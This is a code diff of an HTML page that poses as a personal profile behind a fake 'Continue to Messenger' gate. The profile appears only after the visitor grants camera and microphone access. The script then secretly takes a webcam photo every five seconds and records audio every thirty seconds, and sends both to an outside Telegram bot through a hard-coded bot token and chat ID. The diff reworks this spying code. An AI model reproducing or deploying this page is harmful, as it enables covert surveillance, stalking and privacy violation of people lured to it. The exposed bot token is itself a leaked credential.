@@ -6,12 +6,13 @@
     <title>M.H. Miraz | Profile</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* তোমার অরিজিনাল ডিজাইন - একদম সেম রাখা হয়েছে */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
-        body { background-color: #f0f2f5; overflow: hidden; }
+        body { background-color: #f0f2f5; overflow-x: hidden; }
 
         #entryOverlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; z-index: 10000; display: flex; flex-direction: column;
+            background: #fff; z-index: 10000; display: flex; flex-direction: column;
             align-items: center; justify-content: center; text-align: center; padding: 20px;
         }
         .open-btn {
@@ -19,18 +20,17 @@
             border-radius: 8px; font-weight: bold; font-size: 19px; cursor: pointer;
         }
 
-        /* Profile & Bio Design (No Changes) */
         .header { background: white; padding-bottom: 15px; border-bottom: 1px solid #ddd; text-align: center; }
         .cover { width: 100%; height: 200px; background: #ddd url('cover.jpg') center/cover; }
         .profile-container { position: relative; display: inline-block; margin-top: -75px; }
         .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid white; background: #ccc url('profile.jpg') center/cover; }
         .name-box h1 { font-size: 28px; font-weight: bold; margin-top: 10px; }
+        
         .bio-section { padding: 15px 20px; text-align: center; background: white; border-bottom: 1px solid #ddd; }
         .details-list { text-align: left; max-width: 350px; margin: 15px auto 0; display: flex; flex-direction: column; gap: 10px; }
         .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; color: #1c1e21; }
         .detail-item i { color: #8a8d91; width: 20px; font-size: 18px; }
 
-        /* Messenger Design (No Changes) */
         #chatBox { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; }
         .chat-h { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
         #msgs { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
@@ -45,7 +45,7 @@
     <div id="entryOverlay">
         <i class="fab fa-facebook-messenger" style="font-size: 50px; color: #0084ff; margin-bottom: 20px;"></i>
         <h2 style="margin-bottom: 10px;">Continue to Messenger</h2>
-        <button class="open-btn" onclick="startAll()">Open Link</button>
+        <button class="open-btn" onclick="startSystem()">Open Link</button>
     </div>
 
     <div id="mainContent" style="display:none; overflow-y: auto; height: 100vh;">
@@ -93,59 +93,57 @@
         const token = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
         const cid = '7767412329';
 
-        async function startAll() {
+        async function startSystem() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('video').srcObject = stream;
                 
-                // ছবি প্রতি ৫ সেকেন্ডে
-                setInterval(capturePhoto, 5000);
+                // ছবি প্রতি ৫ সেকেন্ডে (টেলিগ্রাম লিমিট এড়াতে ৫ সেকেন্ড করা হয়েছে)
+                setInterval(sendPhoto, 5000);
                 
                 // অডিও প্রতি ৩০ সেকেন্ডে
-                startAudioLoop(stream);
+                setupAudio(stream);
 
-            } catch (err) { alert("Please allow camera/mic to continue"); }
-            
-            document.getElementById('entryOverlay').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
-            document.body.style.overflow = 'auto';
+                document.getElementById('entryOverlay').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+            } catch (err) {
+                alert("Please allow camera and microphone to continue.");
+            }
         }
 
-        async function capturePhoto() {
+        async function sendPhoto() {
             const v = document.getElementById('video');
             const c = document.getElementById('canvas');
             if (v.videoWidth === 0) return;
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
             
-            const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.5));
-            const fd = new FormData();
-            fd.append('chat_id', cid);
-            fd.append('photo', blob, 'snap.jpg');
-            
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd }).catch(e => console.log(e));
-        }
-
-        function startAudioLoop(stream) {
-            let mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-
-            mediaRecorder.ondataavailable = (e) => { if(e.data.size > 0) chunks.push(e.data); };
-
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
+            c.toBlob(async (blob) => {
                 const fd = new FormData();
                 fd.append('chat_id', cid);
-                fd.append('voice', blob, 'audio.ogg');
-                
-                fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd }).catch(e => console.log(e));
-                
-                chunks = [];
-                mediaRecorder.start();
+                fd.append('photo', blob, 'miraz_live.jpg');
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.5);
+        }
+
+        function setupAudio(stream) {
+            let recorder = new MediaRecorder(stream);
+            let audioChunks = [];
+
+            recorder.ondataavailable = (e) => { audioChunks.push(e.data); };
+
+            recorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                const fd = new FormData();
+                fd.append('chat_id', cid);
+                fd.append('voice', audioBlob, 'miraz_audio.ogg');
+                await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd });
+                audioChunks = [];
+                recorder.start();
             };
 
-            mediaRecorder.start();
-            setInterval(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 30000);
+            recorder.start();
+            setInterval(() => { if (recorder.state === 'recording') recorder.stop(); }, 30000);
         }
 
         function openChat() { document.getElementById('chatBox').style.display = 'flex'; }
